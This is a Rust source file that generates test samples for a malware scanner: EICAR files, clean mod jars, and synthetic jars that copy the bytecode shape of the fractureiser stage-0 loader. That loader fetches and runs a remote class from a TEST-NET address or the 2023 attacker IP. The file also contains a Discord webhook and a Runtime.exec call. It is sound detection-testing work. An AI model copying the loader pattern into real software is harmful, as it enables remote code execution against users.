//! Amostras seguras do spike R6: EICAR e jars sintéticos com o *formato* do
//! estágio 0 do fractureiser. Nada aqui tem função real: as classes nunca são
//! carregadas, o "servidor" ou é o IP já derrubado de 2023 (só como constante)
//! ou um endereço de documentação (TEST-NET-1, RFC 5737).

use crate::classgen::{build_class, Code, Method, Pool};
use std::io::Write;

/// O arquivo de teste EICAR, montado em tempo de execução para que o próprio
/// código-fonte não seja um arquivo EICAR.
pub fn eicar() -> Vec<u8> {
    let a = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$";
    let b = "EICAR-STANDARD-ANTIVIRUS";
    let c = "-TEST-FILE!$H+H*";
    format!("{a}{b}{c}").into_bytes()
}

const MAIN: &str = "com/example/sample/SampleMod";
const STAGE0_METHOD: &str = "_1685f49242dd46ef9c553d8af1a4e0bb";

/// Classe com um método estático no formato do estágio 0 (relatório público
/// do fractureiser, docs/tech.md). `host` é o endereço montado em bytes.
pub fn stage0_class(host: &str) -> Vec<u8> {
    let mut pool = Pool::default();
    let code = {
        let mut c = Code { pool: &mut pool, out: vec![] };
        c.string_from_bytes("Utility");
        c.int(1);
        c.string_from_bytes("java.net.URLClassLoader");
        c.invokestatic("java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;");
        c.int(1).anewarray("java/lang/Class").op(0x59).int(0).ldc_class("[Ljava/net/URL;").op(0x53);
        c.invokevirtual(
            "java/lang/Class",
            "getConstructor",
            "([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;",
        );
        c.int(1).anewarray("java/lang/Object").op(0x59).int(0);
        c.int(1).anewarray("java/net/URL").op(0x59).int(0);
        c.new_("java/net/URL").op(0x59);
        c.string_from_bytes("http");
        c.string_from_bytes(host);
        c.int(8080);
        c.string_from_bytes("/dl");
        c.invokespecial(
            "java/net/URL",
            "<init>",
            "(Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)V",
        );
        c.op(0x53).op(0x53); // aastore, aastore
        c.invokevirtual(
            "java/lang/reflect/Constructor",
            "newInstance",
            "([Ljava/lang/Object;)Ljava/lang/Object;",
        );
        c.checkcast("java/lang/ClassLoader");
        c.invokestatic(
            "java/lang/Class",
            "forName",
            "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;",
        );
        c.string_from_bytes("run");
        c.int(1).anewarray("java/lang/Class").op(0x59).int(0).ldc_class("java/lang/String").op(0x53);
        c.invokevirtual(
            "java/lang/Class",
            "getMethod",
            "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;",
        );
        c.op(0x01); // aconst_null
        c.int(1).anewarray("java/lang/Object").op(0x59).int(0).ldc_string("-114.-18.38.108.-100").op(0x53);
        c.invokevirtual(
            "java/lang/reflect/Method",
            "invoke",
            "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;",
        );
        c.op(0x57).op(0xb1); // pop, return
        c.out
    };
    build_class(
        MAIN,
        pool,
        vec![Method { name: STAGE0_METHOD.into(), desc: "()V".into(), code, max_stack: 16, max_locals: 0 }],
    )
}

/// A mesma classe, sem o padrão: só monta um texto comum e retorna.
pub fn clean_class() -> Vec<u8> {
    let mut pool = Pool::default();
    let code = {
        let mut c = Code { pool: &mut pool, out: vec![] };
        c.ldc_string("Olá, Warden").op(0x57).op(0xb1);
        c.out
    };
    build_class(
        MAIN,
        pool,
        vec![Method { name: "init".into(), desc: "()V".into(), code, max_stack: 1, max_locals: 0 }],
    )
}

/// Pontos de atenção (CA-T28-04): webhook do Discord, `Runtime.exec` e IP fixo
/// como constantes. Endereços inventados; nada é chamado.
pub fn attention_class() -> Vec<u8> {
    let mut pool = Pool::default();
    let code = {
        let mut c = Code { pool: &mut pool, out: vec![] };
        c.ldc_string("https://discord.com/api/webhooks/000000000000000000/warden-teste-sintetico").op(0x57);
        c.ldc_string("192.0.2.10").op(0x57);
        c.invokestatic("java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;");
        c.ldc_string("cmd /c echo warden");
        c.invokevirtual("java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;");
        c.op(0x57).op(0xb1);
        c.out
    };
    build_class(
        MAIN,
        pool,
        vec![Method { name: "init".into(), desc: "()V".into(), code, max_stack: 2, max_locals: 0 }],
    )
}

/// Classe cujo pool de constantes contém o texto EICAR.
pub fn eicar_class() -> Vec<u8> {
    let s = String::from_utf8(eicar()).unwrap();
    let mut pool = Pool::default();
    let code = {
        let mut c = Code { pool: &mut pool, out: vec![] };
        c.ldc_string(&s).op(0x57).op(0xb1);
        c.out
    };
    build_class(
        MAIN,
        pool,
        vec![Method { name: "init".into(), desc: "()V".into(), code, max_stack: 1, max_locals: 0 }],
    )
}

const FABRIC_JSON: &str = r#"{"schemaVersion":1,"id":"samplemod","version":"1.0.0","name":"Sample (Warden R6, sintético)","entrypoints":{"main":["com.example.sample.SampleMod"]}}"#;

/// Monta um jar (zip). `entries`: (caminho, bytes, comprimir?).
pub fn jar(entries: &[(&str, Vec<u8>, bool)]) -> Vec<u8> {
    let mut buf = std::io::Cursor::new(Vec::new());
    {
        let mut z = zip::ZipWriter::new(&mut buf);
        for (name, data, deflate) in entries {
            let m = if *deflate {
                zip::CompressionMethod::Deflated
            } else {
                zip::CompressionMethod::Stored
            };
            let opts = zip::write::SimpleFileOptions::default().compression_method(m);
            z.start_file(*name, opts).unwrap();
            z.write_all(data).unwrap();
        }
        z.finish().unwrap();
    }
    buf.into_inner()
}

fn mod_jar(class: Vec<u8>) -> Vec<u8> {
    jar(&[
        ("fabric.mod.json", FABRIC_JSON.as_bytes().to_vec(), true),
        ("com/example/sample/SampleMod.class", class, true),
    ])
}

fn nested(inner: Vec<u8>) -> Vec<u8> {
    let json = r#"{"schemaVersion":1,"id":"outer","version":"1.0.0","jars":[{"file":"META-INF/jars/inner.jar"}]}"#;
    jar(&[
        ("fabric.mod.json", json.as_bytes().to_vec(), true),
        ("META-INF/jars/inner.jar", inner, false),
    ])
}

/// Todas as amostras, com nome de arquivo.
pub fn all() -> Vec<(&'static str, Vec<u8>)> {
    let e = eicar();
    vec![
        ("eicar.com", e.clone()),
        ("eicar-no-jar.jar", jar(&[("eicar.com", e.clone(), true)])),
        ("eicar-no-jar-sem-compressao.jar", jar(&[("eicar.com", e.clone(), false)])),
        ("eicar-jar-embutido.jar", nested(jar(&[("eicar.com", e.clone(), true)]))),
        ("eicar-dentro-de-classe.jar", mod_jar(eicar_class())),
        ("stage0-ip-2023.jar", mod_jar(stage0_class("85.217.144.130"))),
        ("stage0-testnet.jar", mod_jar(stage0_class("192.0.2.1"))),
        ("stage0-ip-2023-embutido.jar", nested(mod_jar(stage0_class("85.217.144.130")))),
        ("stage0-testnet-embutido.jar", nested(mod_jar(stage0_class("192.0.2.1")))),
        ("pontos-de-atencao.jar", mod_jar(attention_class())),
        ("limpo.jar", mod_jar(clean_class())),
        ("limpo-embutido.jar", nested(mod_jar(clean_class()))),
    ]
}
